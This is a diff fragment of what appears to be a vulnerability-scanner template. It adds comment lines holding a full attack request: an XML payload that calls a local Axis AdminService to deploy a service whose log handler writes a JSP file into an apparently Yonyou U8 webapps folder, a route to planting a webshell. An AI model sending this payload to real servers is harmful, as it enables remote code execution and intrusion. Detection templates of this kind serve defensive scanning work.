@@ -44,3 +44,7 @@ http:
           - contains(interactsh_protocol,'dns')
           - status_code==200
         condition: and
+
+
+# reqData=<?xml version="1.0"?>
+# <!DOCTYPE foo SYSTEM "http://127.0.0.1:8009/services/AdminService?method=!--><deployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"><service name="OpenTaske" provider="java:RPC"><requestFlow><handler type="java:org.apache.axis.handlers.LogHandler" ><parameter name="LogHandler.fileName" value="C:\UFGOV\U8\webapps\bx_cxjk_list.jsp" /><parameter name="LogHandler.writeToConsole" value="false" /></handler></requestFlow><parameter name="className" value="java.util.Random" /><parameter name="allowedMethods" value="*" /></service></deployment">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
